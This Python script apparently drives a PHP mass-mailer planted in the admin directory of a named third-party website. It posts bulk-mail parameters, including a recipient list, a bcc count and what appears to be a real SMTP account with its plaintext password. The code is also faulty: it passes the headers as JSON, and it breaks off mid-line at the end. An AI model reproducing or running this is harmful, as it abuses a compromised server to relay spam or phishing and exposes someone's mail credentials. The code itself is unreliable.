import requests as req
import concurrent.futures as cf

#mialer
url='https://www.samspedispa.com/admin/controller/extension/extension/bcc.php'

h={
    ':authority': 'www.samspedispa.com',
    ':method': 'POST',
    ':path': '/admin/controller/extension/extension/bcc.php',
    ':scheme': 'https',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'content-length': 2623,
    'content-type': 'multipart/form-data;boundary=----WebKitFormBoundaryz1fbUrdFkIsgRgUO',
    'origin': 'https://www.samspedispa.com',
    'referer':' https://www.samspedispa.com/admin/controller/extension/extension/bcc.php',
    'sec-ch-ua': '"Chromium";v="94", "Google Chrome";v="94", ";Not A Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': "Windows",
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': 1,
    'user-agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36'
}


pyl={
    'dbg': 0,
    'my_smtp': 'smtp.ionos.com:25:Tony@groundscontrolinc.com:Umumpnz097:undefined:NOBCC',
    'nrotat': 0,
    'ssl_port': 25,
    'pause': 5,
    'pemails': 18,
    'reconnect': 18,
    'nbcc': 100,
    'from': 'fromlist@youremail.com',
    'realname': 'Name-confi',
    'replyto': 'fromlist@youremail.com',
    'subject': 'sending from post 2',
    'encodety': '7bit',
    'userfile': '(binary)',
    'message': 'this is from a post request',
    'contenttype': 'html',
    'action': 'send',
    'emaillist': 'tony@groundscontrolinc.com'
}

r=req.post(url, data=pyl, json=h)
print(r.status_code)

with req.Session() as rs:
    re.
